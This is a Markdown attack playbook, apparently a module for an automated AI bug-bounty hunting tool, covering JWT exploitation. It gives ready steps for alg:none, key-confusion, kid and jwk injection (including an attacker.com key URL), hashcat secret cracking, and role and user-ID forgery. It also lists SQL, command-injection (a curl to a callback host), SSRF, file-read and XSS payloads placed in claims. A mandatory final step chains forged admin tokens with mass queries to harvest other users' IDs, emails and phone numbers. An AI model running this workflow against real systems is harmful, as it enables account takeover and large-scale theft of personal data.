# JWT Attack Thinking Chain

> Loaded at Phase 2 when JWT detected in cookies, auth headers, or API responses.
> Recognition signal: `eyJ` prefix in base64-encoded token.

---

## Step 0: Detection & Decode

**Where to look for JWT**:
- `Authorization: Bearer eyJ...`
- Cookie: `token=eyJ...` / `jwt=eyJ...` / `access_token=eyJ...`
- Response body: `{"token": "eyJ..."}` or JSON fields named `accessToken`, `jwt`, `auth`

**First action**: Decode header and payload to understand structure.
- Decode URL: `https://jwt.io` or `echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null`
- Read the `alg` field in header (HS256/RS256/none/...)
- Read the claims in payload (sub, role, exp, iss, aud, custom fields)

### Step 0.1: Bearer Stripping Bypass (Try Before Any Crypto Attack)

**When to try**: Multi-role platforms where a low-privilege user's JWT is rejected (401/403) when accessing admin/superior endpoints.

**Core insight**: Some authorization middleware only validates JWT *structure* but not JWT *content* vs endpoint *role requirement*. Or the middleware checks `Authorization` header presence but not the token claims against the target endpoint's role gate.

**Test flow**:
```
Low-privilege user → GET /api/admin/users → 401/403 (expected)
    ↓
Option 1: Remove "Bearer" prefix → Authorization: eyJ... (raw token, no "Bearer ")
    → If 200 → middleware parsed token correctly but role gate triggered by "Bearer" keyword only
    ↓
Option 2: Remove entire Authorization header → GET /api/admin/users (no auth header)
    → If 200 → endpoint has NO authentication requirement (unauthorized access, not JWT bypass)
    ↓
Option 3: Replace Bearer with other schemes → Authorization: Basic eyJ..., Digest eyJ...
    → If 200 → middleware only validates token format, not scheme type
    ↓
Option 4: Duplicate headers → One valid Bearer + one stripped
    Authorization: Bearer eyJ...
    Authorization: eyJ...
    → If 200 → middleware takes last/first header inconsistently
```

**SRC context**: This is a zero-cost bypass attempt. Takes 30 seconds, often overlooked. Especially effective on:
- Platforms with distinct roles (user/admin/merchant/agent)
- Microservice architectures where different services have different auth middleware versions
- API gateways that strip headers before forwarding to backend services

---

## Step 1: Algorithm Attacks (No Key Needed)

### 1.1 alg:none (Empty Signature)
```
Original header: {"alg": "HS256", "typ": "JWT"}
Modified header: {"alg": "none", "typ": "JWT"}
```
- Change payload claims (e.g. `"user":"admin"`)
- Remove signature entirely (leave trailing dot): `header.payload.`
- Test: does server accept unsigned token?

### 1.2 RS256 → HS256 Key Confusion
```
Original: server uses RS256 (public/private key pair)
Attack: change header to HS256, sign with the PUBLIC key (which you can obtain)
```
- Public key often exposed at `/.well-known/jwks.json` or in JS
- Sign modified token using public key as HMAC-SHA256 secret
- If server accepts → full token forgery

### 1.3 kid (Key ID) Injection
```
Header contains "kid" field → server uses it to locate the key file
If kid is user-controlled and not validated:
  "kid": "../../dev/null" → reads empty string, sign with "" as secret
  "kid": "../../../etc/passwd" → uses file content as HMAC key
  "kid": "http://attacker.com/jwk.json" → SSRF via JWT header
```

### 1.4 jwk (Embedded Key) Injection
```
Header: {"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "..."}}
```
- Generate own RSA key pair
- Embed public key as `jwk` in header
- Sign with your private key
- Server may use the embedded jwk to verify — bypassing its own key store

---

## Step 2: Weak Key Brute Force

Only productive when algorithm is HS256/HS384/HS512 (symmetric/HMAC).

**Tool**: `hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist`

**Wordlists to try (in order — stop on first hit)**:
1. **jwt.secrets.list** (本地已有, 103,979 条): `E:\SRC\SRCai批量挖掘\jwt.secrets.list` — 直接读取, 无需下载
2. **Common defaults**: `secret`, `secret1`, `secretkey`, `password`, `changeme`, `key`
3. **JS-extracted keywords dictionary** (HIGH ROI — custom per target):
   - From Phase 1 JS analysis, collect ALL extracted sensitive values:
     - AES keys, `secretKey`, `privateKey`, `key:`, `secret:` values
     - Any hardcoded string assigned to `jwtSecret`, `tokenSecret`, `signKey`, `JWT_KEY`
     - App name, company name, domain name, product code
     - Unique-looking strings in config objects (especially `*.yml` / `*.properties` leaks)
   - Build custom wordlist: `echo "$JS_KEYWORDS" > downloaded/{target_domain}/wordlists/target_jwt_dict.txt`
   - Run: `hashcat -a 0 -m 16500 jwt.txt downloaded/{target_domain}/wordlists/target_jwt_dict.txt`
   - **Why this works**: Developers often reuse the same secret across JWT and other crypto contexts. The AES key in a JS file may also be the JWT signing secret.
4. rockyou.txt: `/usr/share/wordlists/rockyou.txt.gz` (gunzip first)
5. Target-specific: company name, product name, framework defaults

**Known framework default keys**:
- RuoYi (若依): often uses fixed secret in `application.yml`
- JeecgBoot: check default `jeecg-boot` secret
- Spring Boot apps: check `application.properties` for `jwt.secret=`

**In SRC context**: If source leak (Phase 5) reveals JWT secret → direct forgery, no brute force needed.

---

## Step 3: Payload Manipulation (After Key Obtained or Bypass Found)

### Horizontal Priv Esc (IDOR via JWT)
```
Change claim: "sub": "1234567890" → "sub": "1234567891"
Change claim: "userId": 1001 → "userId": 1002
Change claim: "username": "userA" → "username": "userB"
```
- Re-encode with obtained key → access other user's data

### Vertical Priv Esc (Role Elevation)
```
Change claim: "role": "user" → "role": "admin"
Change claim: "isAdmin": false → "isAdmin": true
Change claim: "sysadmin": "N" → "sysadmin": "Y"
Change claim: "type": 0 → "type": 1
Add claim: "admin": true (if not present)
```
- Also test integer vs string: `"role":"0"` → `"role":"1"` or `"role":0` → `"role":1`

### SQL Injection via JWT Claims
```
If JWT claims are used in DB queries:
  "data": "1' UNION SELECT 'key';-- "
  "username": "admin' OR '1'='1"
  "search": "' OR SLEEP(5)--"
```

### Command Injection via JWT Claims
```
If claims reach system commands:
  "cmd": "ping -c 3 127.0.0.1"
  "echo": "yes||whoami"
  "filename": "test; curl http://collaborator/"
```

### SSRF via JWT Claims
```
If claims are used for outbound requests:
  "url": "http://169.254.169.254/latest/meta-data/"
  "callback": "http://collaborator.nets/"
```

### File Read via JWT Claims
```
If claims control file paths:
  "path": "/etc/passwd"
  "file": "../../../etc/shadow"
  "template": "file:///etc/hosts"
```

### XSS via JWT Claims
```
If claims are rendered in UI:
  "name": "<img src=x onerror=console.log('xss')>"
  "displayName": "<script>console.log(document.cookie)</script>"
  → NEVER use alert() in SRC — silent console.log is equally valid proof
```

---

## Step 4: Structural Weakness Checks

| Weakness | Test | Impact |
|----------|------|--------|
| Missing `exp` claim | Token from 30 days ago still works | Permanent access |
| Missing signature verification | Modify payload, keep empty signature | Full forgery |
| `nbf` far in future | Token accepted before activation time | Time bypass |
| No `jti` (JWT ID) | Cannot revoke individual tokens | No logout mechanism |
| `aud` not validated | Token for service A accepted by service B | Cross-service access |
| `iss` not validated | Token from any issuer accepted | Trust boundary bypass |

---

## Step 5: PortSwigger Lab Reference (CTF/Training — NOT SRC rules)

For hands-on practice of each attack type (lab targets use carlos/wiener test accounts):
- Lab 1 (CTF): `alg:none` bypass → `portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature`
- Lab 2 (CTF): Flawed signature → `lab-jwt-authentication-bypass-via-flawed-signature-verification`
- Lab 3 (CTF): Weak key → `lab-jwt-authentication-bypass-via-weak-signing-key`

---

## Step 6: JWT ↔ 泛查询 闭环链路 (MANDATORY)

```
JWT 爆破/伪造成功后:
  → 使用伪造的高权限 Token 访问所有列表/查询接口
  → 以管理员/他人身份重新跑 §23 泛查询变异
  → 预期: 从普通用户视角 → 管理员视角 → 数据范围指数级扩大

反向闭环:
  泛查询泄露他人 userId/邮箱/手机号
  → 提取的用户标识加入 Step 2 自定义字典 (target_jwt_dict.txt)
  → 扩大 JWT 爆破成功率
  → 爆破成功 → 伪造 Token → 再次泛查询 → 更大范围数据泄露

判定: 单独 JWT 爆破=中危, 闭环打通=高危
关联: `references/decision-trees.md` §23 JWT↔泛查询闭环
```

---

*End of jwt-analysis.md*
